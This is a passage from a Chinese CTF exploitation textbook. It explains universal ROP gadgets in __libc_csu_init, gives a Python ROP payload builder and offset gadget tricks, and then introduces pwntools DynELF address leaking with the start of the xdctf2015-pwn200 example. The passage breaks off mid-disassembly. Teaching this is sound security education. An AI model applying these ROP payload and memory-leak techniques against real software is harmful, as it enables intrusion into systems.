__libc_csu_init()
我们知道在程序编译的过程中，会自动加入一些通用函数做初始化的工作，这些初
始化函数都是相同的，所以我们可以考虑在这些函数中找到一些通用的 gadget，在
x64 程序中，就存在这样的 gadget。x64 程序的前六个参数依次通过寄存器 rdi、
rsi、rdx、rcx、r8、r9 进行传递，我们所找的 gadget 自然也是针对这些寄存器进
行操作的。
函数 __libc_csu_init() 用于对 libc 进行初始化，只要程序调用了 libc，就一
定存在这个函数。由于每个版本的 libc 都有一定区别，这里的版本如下：
$ file /usr/lib/libc-2.26.so
/usr/lib/libc-2.26.so: ELF 64-bit LSB shared object, x86-64, ver
sion 1 (GNU/Linux), dynamically linked, interpreter /usr/lib/ld-
linux-x86-64.so.2, BuildID[sha1]=f46739d962ec152b56d2bdb7dadaf8e
576dbf6eb, for GNU/Linux 3.2.0, not stripped
下面用 6.1 pwn hctf2016 brop 的程序来做示范，使用 /r 参数可以打印出原始指
令的十六进制：
gdb-peda$ disassemble /r __libc_csu_init
Dump of assembler code for function __libc_csu_init:
0x00000000004007d0 : 41 57 push r15
0x00000000004007d2 : 41 56 push r14
0x00000000004007d4 : 49 89 d7 mov r15,rdx
0x00000000004007d7 : 41 55 push r13
0x00000000004007d9 : 41 54 push r12
0x00000000004007db : 4c 8d 25 16 06 20 00 lea r
12,[rip+0x200616] # 0x600df8
0x00000000004007e2 : 55 push rbp
0x00000000004007e3 : 48 8d 2d 16 06 20 00 lea r
bp,[rip+0x200616] # 0x600e00
0x00000000004007ea : 53 push rbx
0x00000000004007eb : 41 89 fd mov r13d,edi
644
4.7 通用 gadget
0x00000000004007ee : 49 89 f6 mov r14,rsi
0x00000000004007f1 : 4c 29 e5 sub rbp,r12
0x00000000004007f4 : 48 83 ec 08 sub rsp,0x8
0x00000000004007f8 : 48 c1 fd 03 sar rbp,0x3
0x00000000004007fc : ff 15 f6 07 20 00 call Q
WORD PTR [rip+0x2007f6] # 0x600ff8
0x0000000000400802 : 48 85 ed test rbp,rbp
0x0000000000400805 : 74 1f je 0x400826 
0x0000000000400807 : 31 db xor ebx,ebx
0x0000000000400809 : 0f 1f 80 00 00 00 00 nop D
WORD PTR [rax+0x0]
0x0000000000400810 : 4c 89 fa mov rdx,r15
0x0000000000400813 : 4c 89 f6 mov rsi,r14
0x0000000000400816 : 44 89 ef mov edi,r13d
0x0000000000400819 : 41 ff 14 dc call QWORD PTR
[r12+rbx*8]
0x000000000040081d : 48 83 c3 01 add rbx,0x1
0x0000000000400821 : 48 39 dd cmp rbp,rbx
0x0000000000400824 : 75 ea jne 0x400810 
0x0000000000400826 : 48 83 c4 08 add rsp,0x8
0x000000000040082a : 5b pop rbx
0x000000000040082b : 5d pop rbp
0x000000000040082c : 41 5c pop r12
0x000000000040082e : 41 5d pop r13
0x0000000000400830 : 41 5e pop r14
0x0000000000400832 : 41 5f pop r15
0x0000000000400834 : c3 ret
End of assembler dump.
从中提取出两段（必须以ret结尾），把它们叫做 part1 和 part2：
645
4.7 通用 gadget
0x000000000040082a : 5b pop rbx
0x000000000040082b : 5d pop rbp
0x000000000040082c : 41 5c pop r12
0x000000000040082e : 41 5d pop r13
0x0000000000400830 : 41 5e pop r14
0x0000000000400832 : 41 5f pop r15
0x0000000000400834 : c3 ret
0x0000000000400810 : 4c 89 fa mov rdx,r15
0x0000000000400813 : 4c 89 f6 mov rsi,r14
0x0000000000400816 : 44 89 ef mov edi,r13d
0x0000000000400819 : 41 ff 14 dc call QWORD PTR
[r12+rbx*8]
0x000000000040081d : 48 83 c3 01 add rbx,0x1
0x0000000000400821 : 48 39 dd cmp rbp,rbx
0x0000000000400824 : 75 ea jne 0x400810 
0x0000000000400826 : 48 83 c4 08 add rsp,0x8
0x000000000040082a : 5b pop rbx
0x000000000040082b : 5d pop rbp
0x000000000040082c : 41 5c pop r12
0x000000000040082e : 41 5d pop r13
0x0000000000400830 : 41 5e pop r14
0x0000000000400832 : 41 5f pop r15
0x0000000000400834 : c3 ret
part1 中连续六个 pop，我们可以通过布置栈来设置这些寄存器，然后进入 part2，
前三条语句（r15->rdx、r14->rsi、r13d->edi）分别给三个参数寄存器赋值，然后
调用函数，这里需要注意的是第三句是 r13d（r13低32位）给 edi（rdi低32位）赋
值，即使这样我们还是可以做很多操作了。
另外为了让程序在调用函数返回后还能继续执行，我们需要像下面这样进行构造：
646
4.7 通用 gadget
pop rbx #必须为0
pop rbp #必须为1
pop r12 #函数地址
pop r13 #edi
pop r14 #rsi
pop r15 #rdx
ret #跳转到part2
下面附上一个可直接调用的函数：
def com_gadget(part1, part2, jmp2, arg1 = 0x0, arg2 = 0x0, arg3
= 0x0):
payload = p64(part1) # part1 entry pop_rbx_pop_rbp_pop_r1
2_pop_r13_pop_r14_pop_r15_ret
payload += p64(0x0) # rbx must be 0x0
payload += p64(0x1) # rbp must be 0x1
payload += p64(jmp2) # r12 jump to
payload += p64(arg1) # r13 -> edi arg1
payload += p64(arg2) # r14 -> rsi arg2
payload += p64(arg3) # r15 -> rdx arg3
payload += p64(part2) # part2 entry will call [r12+rbx*0x8]
payload += 'A' * 56 # junk 6*8+8=56
return payload
上面的 gadget 是显而易见的，但如果有人精通汇编字节码，可以找到一些比较隐
蔽的 gadget，比如说指定一个位移点再反编译：
gdb-peda$ disassemble /r 0x0000000000400831,0x0000000000400835
Dump of assembler code from 0x400831 to 0x400835:
0x0000000000400831 : 5e pop r
si
0x0000000000400832 : 41 5f pop r
15
0x0000000000400834 : c3 ret
End of assembler dump.
647
4.7 通用 gadget
gdb-peda$ disassemble /r 0x0000000000400833,0x0000000000400835
Dump of assembler code from 0x400833 to 0x400835:
0x0000000000400833 : 5f pop r
di
0x0000000000400834 : c3 ret
End of assembler dump.
5e 和 5f 分别是 pop rsi 和 pop rdi 的字节码，于是我们可以通过这种
方法轻易地控制 rsi 和 rdi 。
在 6.1.1 pwn HCTF2016 brop 的 exp 中，我们使用了偏移后的 pop rdi; ret ，
而没有用 com_gadget() 函数，感兴趣的童鞋可以尝试使用它重写 exp。
除了上面介绍的 __libc_csu_init() ，还可以到下面的函数中找一找：
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
总之，多试一试总不会错。
参考资料
一步一步学 ROP 系列
648
4.8 使用 DynELF 泄露函数地址
4.8 使用 DynELF 泄露函数地址
DynELF 简介
DynELF 原理
DynELF 实例
参考资料
DynELF 简介
在做漏洞利用时，由于 ASLR 的影响，我们在获取某些函数地址的时候，需要一些
特殊的操作。一种方法是先泄露出 libc.so 中的某个函数，然后根据函数之间的偏
移，计算得到我们需要的函数地址，这种方法的局限性在于我们需要能找到和目标
服务器上一样的 libc.so，而有些特殊情况下往往并不能找到。而另一种方法，利用
如 pwntools 的 DynELF 模块，对内存进行搜索，直接得到我们需要的函数地址。
官方文档里给出了下面的例子：
649
4.8 使用 DynELF 泄露函数地址
# Assume a process or remote connection
p = process('./pwnme')
# Declare a function that takes a single address, and
# leaks at least one byte at that address.
def leak(address):
data = p.read(address, 4)
log.debug("%#x => %s" % (address, (data or '').encode('hex')
))
return data
# For the sake of this example, let's say that we
# have any of these pointers. One is a pointer into
# the target binary, the other two are pointers into libc
main = 0xfeedf4ce
libc = 0xdeadb000
system = 0xdeadbeef
# With our leaker, and a pointer into our target binary,
# we can resolve the address of anything.
#
# We do not actually need to have a copy of the target
# binary for this to work.
d = DynELF(leak, main)
assert d.lookup(None, 'libc') == libc
assert d.lookup('system', 'libc') == system
# However, if we *do* have a copy of the target binary,
# we can speed up some of the steps.
d = DynELF(leak, main, elf=ELF('./pwnme'))
assert d.lookup(None, 'libc') == libc
assert d.lookup('system', 'libc') == system
# Alternately, we can resolve symbols inside another library,
# given a pointer into it.
d = DynELF(leak, libc + 0x1234)
assert d.lookup('system') == system
650
4.8 使用 DynELF 泄露函数地址
可以看到，为了使用 DynELF，首先需要有一个 leak(address) 函数，通过这
一函数可以获取到某个地址上最少 1 byte 的数据，然后将这个函数作为参数调用
d = DynELF(leak, main) ，该模块就初始化完成了，然后就可以使用它提供的
函数进行内存搜索，得到我们需要的函数地址。
类 DynELF 的初始化方法如下：
def __init__(self, leak, pointer=None, elf=None, libcdb=True):
leak ：leak 函数，它是一个 pwnlib.memleak.MemLeak 类的实例
pointer ：一个指向 libc 内任意地址的指针
elf ：elf 文件
libcdb ：libcdb 是一个作者收集的 libc 库，默认启用以加快搜索。
导出的类方法如下：
base() ：解析所有已加载库的基地址
static find_base(leak, ptr) ：提供一个
pwnlib.memleak.MemLeak 对象和一个指向库内的指针，然后找到其基地址
heap() ：通过 __curbrk （链接器导出符号，指向当前brk）找到堆的起始
地址
lookup(symb=None, lib=None) ：找到 lib 中 symbol 的地址
stack() ：通过 __environ （libc导出符号，指向environment block）找
到一个指向栈的指针
dynamic() ：返回指向 .DYNAMIC 的指针
elfclass ：32 或 64 位
elftype ：elf 文件类型
libc ：泄露 build id，下载该文件并加载
link_map ：指向运行时 link_map 对象的指针
DynELF 原理
文档中大概说了下其实现的细节，配合参考资料的文章，大概就可以做到自己实现
一个。
DynELF 使用了两种技术：
解析函数
651
4.8 使用 DynELF 泄露函数地址
ELF 文件会从如 libc.so 库中导入符号，有一系列的表给出了导出符号
名、导出符号地址和导出符号的哈希值。通过对某个符号名做哈希，可以
定位到哈希表中，然后哈希表的位置又提供了字符串表（strtab）和符号
表（symtab）的索引。
假设我们有了 libc.so 的基地址，解析 printf 地址的方法是定位 symtab、
strtab 和 hash 表。对字符串"printf"做哈希，然后定位到哈希表中的某一
条，然后从 symtab 中得到其在 libc.so 的偏移。
解析库地址
如果我们有一个指向动态链接的可执行文件的指针，就可以利用一个称为
link map 的内部链接器结构。这是一个链表结构，包含了每个被加载的库
的信息，包括完整路径和基地址。
有两种方法可以找到这个指向 link map 的指针。两者都是从 DYNAMIC
数组条目中得到的。
在 non-RELOAD 的二进制文件中，该指针在 .got.plt 区域中。
这是通过 DT_PLTGOT 找到的。
在所有二进制文件中，可以在 DT_DEBUG 描述的区域中找到该指
针，甚至在 stripped 之后也不例外。
DynELF 实例
在 libc 中，我们通常使用 write 、 puts 、 printf 来打印指定内存的数据。
write
#include 
ssize_t write(int fd, const void *buf, size_t count);
write 函数用于向文件描述符中写入数据，三个参数分别是文件描述符，一个指针指
向的数据和写入数据的长度。该函数的优点是可以读取任意长度的内存数据，即打
印数据的长度只由 count 控制，缺点则是需要传递 3 个参数。32 位程序通过栈传
递参数，直接将参数布置在栈上就可以了，而 64 位程序首先使用寄存器传递参
数，所以我们通常使用通用 gadget（参见章节4.7） 来为 write 函数传递参数。
例子是 xdctf2015-pwn200，文件地址。在这个程序中也只有 write 可以利用：
652
4.8 使用 DynELF 泄露函数地址
$ rabin2 -R pwn200
...
vaddr=0x0804a004 paddr=0x00001004 type=SET_32 read
vaddr=0x0804a010 paddr=0x00001010 type=SET_32 write
另外我们还需要 read 函数用于读入 '/bin/sh` 到 .bss 段中：
$ readelf -S pwn200 | grep .bss
[25] .bss NOBITS 0804a020 00101c 00002c
00 WA 0 0 32
栈溢出漏洞很明显，偏移为 112：
gdb-peda$ pattern_offset 0x41384141
1094205761 found at offset: 112
在 r2 中对程序进行分析，发现一个漏洞函数，地址为 0x08048484 ：
653
4.8 使用 DynELF 泄露函数地址
[0x080483d0]> pdf @ sub.setbuf_484
/ (fcn) sub.setbuf_484 58
| sub.setbuf_484 ();
| ; var int local_6ch @ ebp-0x6c
| ; var int local_4h @ esp+0x4
| ; var int local_8h @ esp+0x8
| ; CALL XREF from 0x0804855f (main)
| 0x08048484 55 push ebp
| 0x08048485 89e5 mov ebp, esp
| 0x08048487 81ec88000000 sub esp, 0x88
| 0x0804848d a120a00408 mov eax, dword [obj.s
tdin] ; [0x804a020:4]=0
| 0x08048492 8d5594 lea edx, [local_6ch]
| 0x08048495 89542404 mov dword [local_4h],